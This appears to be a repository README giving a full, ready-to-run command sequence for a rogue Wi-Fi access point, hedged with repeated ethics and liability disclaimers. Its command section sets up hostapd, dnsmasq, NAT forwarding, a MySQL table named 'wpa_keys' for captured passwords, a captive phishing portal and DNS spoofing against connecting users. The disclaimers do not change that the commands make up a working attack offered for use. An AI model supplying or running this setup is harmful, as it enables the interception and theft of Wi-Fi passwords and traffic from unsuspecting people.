# create a rogue WiFi Access point 
The provided script is a set of instructions to set up a rogue Wi-Fi access point (AP) with a captive portal, allowing the attacker to capture sensitive information from unsuspecting users who connect to the rogue AP. It also involves internet access sharing and setting up a MySQL database to store captured information.

Please note that such activities are unethical and illegal without explicit consent from the network owner. Engaging in unauthorized network access or any form of cyber-attacks is a violation of the law and can lead to severe consequences.

# I am  describing the steps mentioned in the script, but again, I must emphasize that this information should only be used for educational and ethical purposes.

# Preparing:
This section lists the necessary packages to install and some initial setup steps. The 'apt-get update' command updates the package index, 'apt-get install' installs necessary software packages including hostapd, dnsmasq, and apache2. airmon-ng puts the wireless interface (wlan0) into monitor mode.

# Configuring hostapd:
The script asks you to create a configuration file named hostapd.conf using the nano text editor. In this file, you define the SSID (WiFi name), channel, and other settings for the rogue AP.

# Configuring dnsmasq:
A configuration file named dnsmasq.conf is created to configure the DHCP and DNS settings for the rogue AP.

# Routing table and gateway:
Sets up the network interface wlan0mon with a static IP address of 192.168.1.1 and adds a route to the local network.

# Internet access sharing:
This section uses iptables to enable internet access sharing for the connected clients via the eth0 interface.

# MySQL database setup:
Starts the MySQL service and then uses the mysql command-line tool to create a database named 'fap' and a user named 'fapuser' with specific privileges on the 'fap' database.

# Captive portal setup:
Clears the contents of the /var/www/html/ directory, moves the fap.zip file to that directory, and unzips its contents. This sets up a simple web server that can host the captive portal.

# Starting the attack:
This section starts the rogue AP using hostapd and configures DNS spoofing using dnsspoof. DNS spoofing is used to redirect DNS requests made by clients to the attacker's IP address (in this case, wlan0mon).

Again, I must emphasize that attempting to execute this script without proper authorization is illegal and unethical. Unauthorized access to networks, data interception, and any form of cyber-attack are serious offenses. Always act responsibly and respect the laws and privacy of others.


## Liability Disclaimer:

The information provided in the script earlier is intended solely for educational and informational purposes. It should not be used for any malicious or unauthorized activities. Engaging in unauthorized network access, cyber-attacks, or any illegal activities is strictly prohibited and can result in severe legal consequences.

The instructions mentioned in the script are designed for understanding various network and security concepts. They should only be used in controlled, legal, and authorized environments with explicit consent from the network owner or administrator.

The misuse of the knowledge presented in this script to create rogue Wi-Fi access points or engage in any form of cyber-attacks is unethical and against the principles of responsible and respectful use of technology.

If you are uncertain about the legality or ethical implications of any action related to networking, security, or any other technology-related matters, seek advice from qualified professionals or authorized personnel.

By accessing and using this information, you agree to act responsibly and lawfully, and you acknowledge that any misuse of this knowledge is solely your responsibility.

# Remember, technology can be used to benefit society and improve lives, so let us strive to use our knowledge for positive and ethical purposes.
# BEWARE

# To the maximum extent permitted by applicable law, I and/or affiliates from whom this repo is sourced and or submitted content to this repo, shall not be liable for any indirect, incidental, special, consequential, or punitive damages, or any loss of profits or revenue, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses, resulting from:






# FOLLOW THIS Commands

 # --- Preparing ---:

	apt-get update

	apt-get install hostapd dnsmasq apache2 

	airmon-ng start wlan0

	mkdir ~/fap

	cd ~/fap

	nano hostapd.conf 

 # Instructions for hostapd.conf: 

interface=[INTERFACE NAME]
driver=nl80211
ssid=[WiFi NAME]
hw_mode=g
channel=8
macaddr_acl=0
ignore_broadcast_ssid=0

	nano dnsmasq.conf

 # Instructions for dnsmasq.conf: 

interface=[INTERFACE NAME]
dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
dhcp-option=3, 192.168.1.1
dhcp-option=6, 192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1

 # Routing table and gateway:

	ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

 # Internet access:

	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
	echo 1 > /proc/sys/net/ipv4/ip_forward

 # mysql database:
	
	service mysql start
	
	mysql
	
	create database fap;

	create user fapuser;

	grant all on rogueap.* to 'fapuser'@'localhost' identified by 'fappassword';

	use fap;

	create table wpa_keys(password1 varchar(40), password2 varchar(40));
	
	ALTER DATABASE fap CHARACTER SET 'utf8';

	select * from wpa_keys;
	
# Captive portal setup:
	
	rm -rf /var/www/html/*
	
	mv ~/Downloads/fap.zip /var/www/html
	
	cd /var/www/html
	
	unzip fap.zip 
	
	service apache2 start
	

 # --- Starting the attack ---: 

	hostapd hostapd.conf

	dnsmasq -C dnsmasq.conf -d

	dnsspoof -i wlan0mon
